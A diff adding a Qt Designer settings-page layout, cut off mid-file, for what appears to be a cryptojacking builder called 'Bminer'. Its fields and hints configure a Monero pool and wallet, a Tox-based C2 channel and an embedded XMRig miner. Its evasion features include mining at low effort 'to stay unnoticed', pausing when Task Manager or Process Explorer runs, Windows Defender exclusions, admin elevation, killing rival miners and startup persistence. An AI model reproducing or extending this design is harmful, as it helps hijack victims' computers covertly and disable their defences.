@@ -1,0 +1,1535 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<ui version="4.0">
+ <class>SettingsPage</class>
+ <widget class="QWidget" name="SettingsPage">
+  <property name="geometry">
+   <rect>
+    <x>0</x>
+    <y>0</y>
+    <width>1185</width>
+    <height>900</height>
+   </rect>
+  </property>
+  <layout class="QVBoxLayout" name="rootLayout">
+   <property name="spacing">
+    <number>10</number>
+   </property>
+   <property name="leftMargin">
+    <number>0</number>
+   </property>
+   <property name="topMargin">
+    <number>0</number>
+   </property>
+   <property name="rightMargin">
+    <number>0</number>
+   </property>
+   <property name="bottomMargin">
+    <number>0</number>
+   </property>
+   <item>
+    <layout class="QVBoxLayout" name="headerLayout">
+     <property name="spacing">
+      <number>1</number>
+     </property>
+     <item>
+      <widget class="QLabel" name="sectionTitle">
+       <property name="text">
+        <string>Settings</string>
+       </property>
+      </widget>
+     </item>
+    </layout>
+   </item>
+   <item>
+    <widget class="QScrollArea" name="scrollArea">
+     <property name="frameShape">
+      <enum>QFrame::Shape::NoFrame</enum>
+     </property>
+     <property name="horizontalScrollBarPolicy">
+      <enum>Qt::ScrollBarPolicy::ScrollBarAlwaysOff</enum>
+     </property>
+     <property name="widgetResizable">
+      <bool>true</bool>
+     </property>
+     <widget class="QWidget" name="scrollContents">
+      <property name="geometry">
+       <rect>
+        <x>0</x>
+        <y>0</y>
+        <width>1168</width>
+        <height>1328</height>
+       </rect>
+      </property>
+      <layout class="QVBoxLayout" name="contentLayout">
+       <property name="spacing">
+        <number>10</number>
+       </property>
+       <property name="leftMargin">
+        <number>0</number>
+       </property>
+       <property name="topMargin">
+        <number>0</number>
+       </property>
+       <property name="rightMargin">
+        <number>6</number>
+       </property>
+       <property name="bottomMargin">
+        <number>0</number>
+       </property>
+
+       <!-- ============ ENDPOINT AND ADDRESSES ============ -->
+       <item>
+        <widget class="QGroupBox" name="addressGroup">
+         <property name="title">
+          <string>ENDPOINT AND ADDRESSES</string>
+         </property>
+         <layout class="QVBoxLayout" name="addressLayout">
+          <property name="spacing">
+           <number>8</number>
+          </property>
+          <item>
+<widget class="ValidatedField" name="endpointField" native="true">
+             <property name="label" stdset="0">
+              <string>Web panel URL</string>
+             </property>
+            <property name="placeholder" stdset="0">
+             <string>https://host.example:8443/path</string>
+            </property>
+             <property name="hint" stdset="0">
+              <string>Only required in Endpoint update mode. The panel URL the built client reports to. http or https, port optional. Not needed for Tox or Config-link mode.</string>
+             </property>
+             <property name="optional" stdset="0">
+              <bool>false</bool>
+             </property>
+             <property name="rule" stdset="0">
+              <string notr="true">url</string>
+             </property>
+           </widget>
+          </item>
+          <item>
+<widget class="ValidatedField" name="poolField" native="true">
+             <property name="label" stdset="0">
+              <string>Pool address</string>
+             </property>
+             <property name="placeholder" stdset="0">
+              <string>stratum+tcp://pool.example.com:4444</string>
+             </property>
+             <property name="hint" stdset="0">
+              <string>Required to build a functional client. host:port, with an optional stratum+tcp, stratum+ssl or tls scheme.</string>
+             </property>
+             <property name="optional" stdset="0">
+              <bool>false</bool>
+             </property>
+            <property name="rule" stdset="0">
+             <string notr="true">pool</string>
+            </property>
+           </widget>
+          </item>
+          <item>
+<widget class="ValidatedField" name="walletField" native="true">
+             <property name="label" stdset="0">
+              <string>Monero (XMR) wallet address</string>
+             </property>
+             <property name="placeholder" stdset="0">
+              <string>4… or 8…</string>
+             </property>
+             <property name="hint" stdset="0">
+              <string>Required to build a functional client. Base58. Prefix, length and alphabet are checked; the checksum is not.</string>
+             </property>
+             <property name="optional" stdset="0">
+              <bool>false</bool>
+             </property>
+            <property name="rule" stdset="0">
+             <string notr="true">monero</string>
+            </property>
+            <property name="copyable" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <widget class="ValidatedField" name="toxField" native="true">
+            <property name="label" stdset="0">
+             <string>Tox ID (C2 channel)</string>
+            </property>
+            <property name="placeholder" stdset="0">
+             <string>76 hexadecimal characters</string>
+            </property>
+            <property name="hint" stdset="0">
+             <string>76 hex characters. The operator's Tox ID; the client reaches back over the encrypted, serverless Tox network for C2. Any valid 76-char ID enables C2 in every config-update mode.</string>
+            </property>
+            <property name="optional" stdset="0">
+             <bool>true</bool>
+            </property>
+             <property name="rule" stdset="0">
+              <string notr="true">tox</string>
+             </property>
+             <property name="copyable" stdset="0">
+              <bool>true</bool>
+             </property>
+            </widget>
+           </item>
+           <item>
+            <widget class="QLabel" name="toxPairValue">
+             <property name="text">
+              <string>No generated Tox pair yet.</string>
+             </property>
+             <property name="wordWrap">
+              <bool>true</bool>
+             </property>
+             <property name="role" stdset="0">
+              <string notr="true">body</string>
+             </property>
+             <property name="textInteractionFlags" stdset="0">
+              <set>Qt::TextInteractionFlag::TextSelectableByMouse</set>
+             </property>
+            </widget>
+           </item>
+           <item>
+            <layout class="QHBoxLayout" name="toxPairActions">
+             <item>
+              <widget class="QPushButton" name="generateToxPairButton">
+               <property name="text">
+                <string>Generate new Tox pair</string>
+               </property>
+               <property name="toolTip" stdset="0">
+                <string>Creates a fresh operator + bot Tox identities. The operator private key is the C2 root.</string>
+               </property>
+              </widget>
+             </item>
+             <item>
+              <widget class="QPushButton" name="exportToxPairButton">
+               <property name="text">
+                <string>Export operator savedata…</string>
+               </property>
+               <property name="ghost" stdset="0">
+                <bool>true</bool>
+               </property>
+              </widget>
+             </item>
+             <item>
+              <spacer name="toxPairSpacer">
+               <property name="orientation">
+                <enum>Qt::Orientation::Horizontal</enum>
+               </property>
+               <property name="sizeHint" stdset="0">
+                <size>
+                 <width>40</width>
+                 <height>10</height>
+                </size>
+               </property>
+              </spacer>
+             </item>
+            </layout>
+           </item>
+           <item>
+            <widget class="QLabel" name="toxPairNote">
+             <property name="text">
+              <string/>
+             </property>
+             <property name="wordWrap">
+              <bool>true</bool>
+             </property>
+             <property name="role" stdset="0">
+              <string notr="true">faint</string>
+             </property>
+            </widget>
+           </item>
+          <item>
+           <widget class="QFrame" name="addressLine">
+            <property name="minimumSize">
+             <size>
+              <width>0</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          </layout>
+        </widget>
+       </item>
+
+       <!-- ============ MINING ============ -->
+       <item>
+        <widget class="QGroupBox" name="miningGroup">
+         <property name="title">
+          <string>MINING</string>
+         </property>
+         <layout class="QVBoxLayout" name="miningLayout">
+          <property name="spacing">
+           <number>6</number>
+          </property>
+          <!-- ── Idle mining ───────────────────────────────────────────── -->
+          <item>
+           <layout class="QHBoxLayout" name="idleRow">
+            <item>
+             <layout class="QVBoxLayout" name="idleText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="idleTitle">
+                <property name="text">
+                 <string>Idle mining</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+<widget class="QLabel" name="idleSubtitle">
+                 <property name="text">
+                  <string>Mine once the keyboard and mouse have been untouched for the threshold below. The CPU effort applies to the embedded CPU miner.</string>
+                 </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <layout class="QHBoxLayout" name="idleControls">
+              <property name="spacing">
+               <number>6</number>
+              </property>
+              <item>
+<widget class="QLabel" name="idleEffortLabel">
+                 <property name="text">
+                  <string>CPU effort</string>
+                 </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QSpinBox" name="idleEffortSpin">
+                <property name="minimumSize">
+                 <size>
+                  <width>72</width>
+                  <height>0</height>
+                 </size>
+                </property>
+                <property name="suffix">
+                 <string> %</string>
+                </property>
+                <property name="minimum">
+                 <number>1</number>
+                </property>
+                <property name="maximum">
+                 <number>100</number>
+                </property>
+                <property name="value">
+                 <number>100</number>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="ToggleSwitch" name="idleSwitch" native="true"/>
+              </item>
+             </layout>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="miningLine1">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="idleAfterRow">
+            <item>
+             <layout class="QVBoxLayout" name="idleAfterText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="idleAfterTitle">
+                <property name="text">
+                 <string>Idle threshold</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="idleAfterSubtitle">
+                <property name="text">
+                 <string>Minutes of inactivity before the machine is considered idle.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="QSpinBox" name="idleAfterSpin">
+              <property name="minimumSize">
+               <size>
+                <width>96</width>
+                <height>0</height>
+               </size>
+              </property>
+              <property name="maximumSize">
+               <size>
+                <width>96</width>
+                <height>16777215</height>
+               </size>
+              </property>
+              <property name="alignment">
+               <set>Qt::AlignmentFlag::AlignRight|Qt::AlignmentFlag::AlignTrailing|Qt::AlignmentFlag::AlignVCenter</set>
+              </property>
+              <property name="suffix">
+               <string> min</string>
+              </property>
+              <property name="minimum">
+               <number>1</number>
+              </property>
+              <property name="maximum">
+               <number>120</number>
+              </property>
+              <property name="value">
+               <number>5</number>
+              </property>
+             </widget>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="miningLine2">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <!-- ── Active mining ─────────────────────────────────────────── -->
+          <item>
+           <layout class="QHBoxLayout" name="activeRow">
+            <item>
+             <layout class="QVBoxLayout" name="activeText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="activeTitle">
+                <property name="text">
+                 <string>Active mining</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+<widget class="QLabel" name="activeSubtitle">
+                 <property name="text">
+                  <string>Mine even while the user is at the keyboard. Keep effort low to stay unnoticed. The CPU effort applies to the embedded CPU miner.</string>
+                 </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <layout class="QHBoxLayout" name="activeControls">
+              <property name="spacing">
+               <number>6</number>
+              </property>
+              <item>
+<widget class="QLabel" name="activeEffortLabel">
+                 <property name="text">
+                  <string>CPU effort</string>
+                 </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QSpinBox" name="activeEffortSpin">
+                <property name="minimumSize">
+                 <size>
+                  <width>72</width>
+                  <height>0</height>
+                 </size>
+                </property>
+                <property name="suffix">
+                 <string> %</string>
+                </property>
+                <property name="minimum">
+                 <number>1</number>
+                </property>
+                <property name="maximum">
+                 <number>100</number>
+                </property>
+                <property name="value">
+                 <number>50</number>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="ToggleSwitch" name="activeSwitch" native="true"/>
+              </item>
+             </layout>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="miningLine3">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="tlsRow">
+            <item>
+             <layout class="QVBoxLayout" name="tlsText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="tlsTitle">
+                <property name="text">
+                 <string>Encrypt the pool connection (TLS)</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="tlsSubtitle">
+                <property name="text">
+                 <string>Most pools expose a separate TLS port. Check the pool address points at it.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="tlsSwitch" native="true"/>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="miningLine4">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="cpuRow" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="cpuText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="cpuTitle">
+                <property name="text">
+                 <string>Embed the CPU miner (XMRig)</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="cpuSubtitle">
+                <property name="text">
+                 <string>Embeds xmrig.exe as a resource so mining works even before the panel is reached.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="cpuSwitch" native="true"/>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="miningLine5">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="gpuRow" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="gpuText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="gpuTitle">
+                <property name="text">
+                 <string>Embed the GPU miner (GMiner)</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="gpuSubtitle">
+                <property name="text">
+                 <string>GPU mining is not supported in this release and may return in a future update. CPU-only builds.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="gpuSwitch" native="true"/>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="miningLine6">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+            <widget class="ValidatedField" name="configUrlField" native="true">
+            <property name="label" stdset="0">
+             <string>Direct config URL</string>
+            </property>
+            <property name="placeholder" stdset="0">
+             <string>https://host.example/path/config.json</string>
+            </property>
+            <property name="hint" stdset="0">
+             <string>Optional. Only used when the Build page's Config update mode is set to Config link. The client fetches its mining config straight from this URL instead of the panel.</string>
+            </property>
+            <property name="optional" stdset="0">
+             <bool>true</bool>
+            </property>
+            <property name="rule" stdset="0">
+             <string notr="true">url</string>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <widget class="ValidatedField" name="passwordField" native="true">
+            <property name="label" stdset="0">
+             <string>Pool password</string>
+            </property>
+            <property name="placeholder" stdset="0">
+             <string>x</string>
+            </property>
+            <property name="hint" stdset="0">
+             <string>Optional. Shared with the Build page; empty writes “x”.</string>
+            </property>
+            <property name="optional" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <widget class="ValidatedField" name="watchedField" native="true">
+            <property name="label" stdset="0">
+             <string>Watched processes</string>
+            </property>
+            <property name="placeholder" stdset="0">
+             <string>taskmgr.exe, procexp.exe</string>
+            </property>
+            <property name="hint" stdset="0">
+             <string>Comma-separated process names. The miner suspends while any of them is running, and they are excluded from the Foreign Miner Killer.</string>
+            </property>
+            <property name="optional" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <widget class="QLabel" name="miningWarning">
+            <property name="text">
+             <string/>
+            </property>
+            <property name="wordWrap">
+             <bool>true</bool>
+            </property>
+            <property name="role" stdset="0">
+             <string notr="true">warn</string>
+            </property>
+           </widget>
+          </item>
+         </layout>
+        </widget>
+       </item>
+
+       <!-- ============ FEATURES ============ -->
+       <item>
+        <widget class="QGroupBox" name="corefeatures">
+         <property name="title">
+          <string>FEATURES (Priority Order)</string>
+         </property>
+         <layout class="QVBoxLayout" name="coreFeaturesLayout">
+          <property name="spacing">
+           <number>6</number>
+          </property>
+
+          <item>
+           <widget class="QLabel" name="featuresNote">
+            <property name="text">
+             <string>Foreign Miner Killer and Defender Exclusion require the Admin Manifest, which makes the built client request administrator privileges at launch. The builder itself does not need to run elevated.</string>
+            </property>
+            <property name="wordWrap">
+             <bool>true</bool>
+            </property>
+            <property name="role" stdset="0">
+             <string notr="true">faint</string>
+            </property>
+           </widget>
+          </item>
+
+          <!-- PRIORITY 1: Admin Manifest -->
+          <item>
+           <layout class="QHBoxLayout" name="featureRow1" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="featureText1">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="featureTitle1">
+                <property name="text">
+                 <string>P1: Admin Manifest</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="featureSubtitle1">
+                <property name="text">
+                 <string>Builds the miner with a manifest that requests administrator rights. Windows shows a UAC prompt at launch.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="featureSwitch1" native="true"/>
+            </item>
+           </layout>
+          </item>
+
+          <!-- PRIORITY 2: Foreign Miner Killer -->
+          <item>
+           <layout class="QHBoxLayout" name="featureRow2" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="featureText2">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="featureTitle2">
+                <property name="text">
+                 <string>P2: Foreign Miner Killer</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="featureSubtitle2">
+                <property name="text">
+                 <string>Terminates non-Bminer miners detected by network activity on stratum ports. Our own miners, watched processes and legitimate Windows software are excluded.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="featureSwitch2" native="true"/>
+            </item>
+           </layout>
+          </item>
+
+          <!-- PRIORITY 3: Defender Exclusion -->
+          <item>
+           <layout class="QHBoxLayout" name="featureRow3" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="featureText3">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="featureTitle3">
+                <property name="text">
+                 <string>P3: Defender Exclusion</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="featureSubtitle3">
+                <property name="text">
+                 <string>Adds the miner folder to Windows Defender exclusions to prevent false positives and real-time scanning interference.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="featureSwitch3" native="true"/>
+            </item>
+           </layout>
+          </item>
+
+          <!-- PRIORITY 4: Debug Console -->
+          <item>
+           <layout class="QHBoxLayout" name="featureRow5" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="featureText5">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="featureTitle5">
+                <property name="text">
+                 <string>P4: Debug Console</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="featureSubtitle5">
+                <property name="text">
+                 <string>Shows a console window with the miner's debug output.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="featureSwitch5" native="true"/>
+            </item>
+           </layout>
+          </item>
+
+          <!-- PRIORITY 5: Persistence -->
+          <item>
+           <layout class="QHBoxLayout" name="featureRow6" stretch="1,0">
+            <property name="spacing">
+             <number>12</number>
+            </property>
+            <item>
+             <layout class="QVBoxLayout" name="featureText6">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="featureTitle6">
+                <property name="text">
+                 <string>P5: Persistence</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="featureSubtitle6">
+                <property name="text">
+                 <string>Adds a startup entry so the miner launches when you sign in.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="featureSwitch6" native="true"/>
+            </item>
+           </layout>
+          </item>
+
+         </layout>
+        </widget>
+       </item>
+
+       <!-- ============ BUILDER APPEARANCE ============ -->
+       <item>
+        <widget class="QGroupBox" name="appearanceGroup">
+         <property name="title">
+          <string>BUILDER · APPEARANCE</string>
+         </property>
+         <layout class="QVBoxLayout" name="appearanceLayout">
+          <property name="spacing">
+           <number>6</number>
+          </property>
+          <item>
+           <widget class="QLabel" name="builderOnlyNote">
+            <property name="text">
+             <string>Builder-only — these preferences apply to this app and do not ship in the built client.</string>
+            </property>
+            <property name="wordWrap">
+             <bool>true</bool>
+            </property>
+            <property name="role" stdset="0">
+             <string notr="true">faint</string>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="accentRow">
+            <item>
+             <layout class="QVBoxLayout" name="accentText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="accentTitle">
+                <property name="text">
+                 <string>Accent colour</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="accentSubtitle">
+                <property name="text">
+                 <string>Applies immediately across the window.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="QPushButton" name="accentPink">
+              <property name="minimumSize">
+               <size>
+                <width>30</width>
+                <height>24</height>
+               </size>
+              </property>
+              <property name="maximumSize">
+               <size>
+                <width>30</width>
+                <height>24</height>
+               </size>
+              </property>
+              <property name="toolTip">
+               <string>pink</string>
+              </property>
+              <property name="text">
+               <string/>
+              </property>
+              <property name="checkable">
+               <bool>true</bool>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <widget class="QPushButton" name="accentPurple">
+              <property name="minimumSize">
+               <size>
+                <width>30</width>
+                <height>24</height>
+               </size>
+              </property>
+              <property name="maximumSize">
+               <size>
+                <width>30</width>
+                <height>24</height>
+               </size>
+              </property>
+              <property name="toolTip">
+               <string>purple</string>
+              </property>
+              <property name="text">
+               <string/>
+              </property>
+              <property name="checkable">
+               <bool>true</bool>
+              </property>
+             </widget>
+            </item>
+            <item>
+             <widget class="QPushButton" name="accentTeal">
+              <property name="minimumSize">
+               <size>
+                <width>30</width>
+                <height>24</height>
+               </size>
+              </property>
+              <property name="maximumSize">
+               <size>
+                <width>30</width>
+                <height>24</height>
+               </size>
+              </property>
+              <property name="toolTip">
+               <string>teal</string>
+              </property>
+              <property name="text">
+               <string/>
+              </property>
+              <property name="checkable">
+               <bool>true</bool>
+              </property>
+             </widget>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="appearanceLine1">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="animationsRow">
+            <item>
+             <layout class="QVBoxLayout" name="animationsText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="animationsTitle">
+                <property name="text">
+                 <string>Animations</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="animationsSubtitle">
+                <property name="text">
+                 <string>Idle motion on the badge and the pet.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="animationsSwitch" native="true"/>
+            </item>
+           </layout>
+          </item>
+          <item>
+           <widget class="QFrame" name="appearanceLine2">
+            <property name="maximumSize">
+             <size>
+              <width>16777215</width>
+              <height>1</height>
+             </size>
+            </property>
+            <property name="frameShape">
+             <enum>QFrame::Shape::HLine</enum>
+            </property>
+            <property name="hline" stdset="0">
+             <bool>true</bool>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QHBoxLayout" name="trayRow">
+            <item>
+             <layout class="QVBoxLayout" name="trayText">
+              <property name="spacing">
+               <number>1</number>
+              </property>
+              <item>
+               <widget class="QLabel" name="trayTitle">
+                <property name="text">
+                 <string>Close to tray</string>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">fieldLabel</string>
+                </property>
+               </widget>
+              </item>
+              <item>
+               <widget class="QLabel" name="traySubtitle">
+                <property name="text">
+                 <string>Closing the window keeps Bminer running in the notification area.</string>
+                </property>
+                <property name="wordWrap">
+                 <bool>true</bool>
+                </property>
+                <property name="role" stdset="0">
+                 <string notr="true">faint</string>
+                </property>
+               </widget>
+              </item>
+             </layout>
+            </item>
+            <item>
+             <widget class="ToggleSwitch" name="traySwitch" native="true"/>
+            </item>
+           </layout>
+          </item>
+         </layout>
+        </widget>
+       </item>
+
+       <!-- ============ DESKTOP PET ============ -->
+       <item>
+        <widget class="QGroupBox" name="petGroup">
+         <property name="title">
+          <string>BUILDER · DESKTOP PET</string>
+         </property>
+         <layout class="QVBoxLayout" name="petLayout">
+          <property name="spacing">
+           <number>6</number>
+          </property>
+          <item>
+           <widget class="QLabel" name="petCaption">
+            <property name="text">
+             <string>A bacterium that wanders the desktop in its own window. Nothing else depends on it.</string>
+            </property>
+            <property name="wordWrap">
+             <bool>true</bool>
+            </property>
+            <property name="role" stdset="0">
+             <string notr="true">faint</string>
+            </property>
+           </widget>
+          </item>
+          <item>
+           <layout class="QGridLayout" name="petGrid">
+            <property name="horizontalSpacing">
+             <number>24</number>
+            </property>
+            <property name="verticalSpacing">
+             <number>6</number>
+            </property>
+            <item row="0" column="0">
+             <widget class="QCheckBox" name="petEnabledBox">
+              <property name="text">
+               <string>Show the desktop pet</string>
+              </property>
+             </widget>
